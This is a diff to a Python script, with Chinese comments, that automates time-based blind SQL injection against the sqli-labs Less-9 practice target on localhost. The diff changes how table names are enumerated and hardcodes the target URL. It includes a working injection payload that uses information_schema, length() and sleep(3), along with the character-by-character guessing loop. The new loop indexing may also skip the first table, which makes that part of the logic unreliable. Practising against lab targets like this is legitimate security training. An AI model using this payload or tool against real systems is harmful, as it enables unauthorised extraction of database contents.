@@ -1,5 +1,4 @@
 import requests
-import optparse
 
 # 存放数据库名变量
 DBName = ""
@@ -94,8 +93,8 @@ def GetTableName(url,DBName):
     # 遍历表名时临时存放表名长度变量
     tableLen = 0
     # a表示当前正在获取表的索引
-    for a in range(0,DBTableCount):
-        print("[-]正在获取第{0}个表名".format(a+1))
+    for a in range(1,DBTableCount+1):
+        print("[-]正在获取第{0}个表名".format(a))
         # 先获取当前表名的长度
         ## 获取payload
         payload = "' and if((select length(table_name) from information_schema.tables where table_schema='{0}' limit {1},1)={2},1,sleep(3)) --+"
@@ -121,12 +120,12 @@ def GetTableName(url,DBName):
                 try:
                     requests.get(targetUrl.format(DBName, a, b, c),2)
                 except Exception:
-                    print(f"正在获取第{a+1}段表名，猜解第{b}个字符，第{c-32}次失败")
+                    print(f"正在获取第{a}段表名，猜解第{b}个字符，第{c-32}次失败")
                 else:
                     print(f"第{c-32}次获取成功，为: ",chr(c))
                     table += chr(c)
                     
-        print(f"[+]拆解完成，第{a+1}段表名为{table}")
+        print(f"[+]拆解完成，第{a}段表名为{table}")
         # 把获取到的名加入DBTables
         DBTables.append(table)
         # 清空table
@@ -158,10 +157,5 @@ def GetDBColumns(url,DBName,DBTables):
 
 
 if __name__ == '__main__':
-    parser = optparse.OptionParser('usage: python %prog -u url \n\n'
-                                   'Example: python %prog -u http://127.0.0.1/sqli-labs/Less-9/?id=1\n')
-    # 目标URL参数-u
-    parser.add_option('-u', '--url', dest='targetURL', default='http://127.0.0.1/sqli-labs/Less-9/?id=1', type='string',
-                      help='target URL')
-    (options, args) = parser.parse_args()
-    StartSqli(options.targetURL)
+    url="http://127.0.0.1:81/Less-9/?id=1"
+    StartSqli(url)
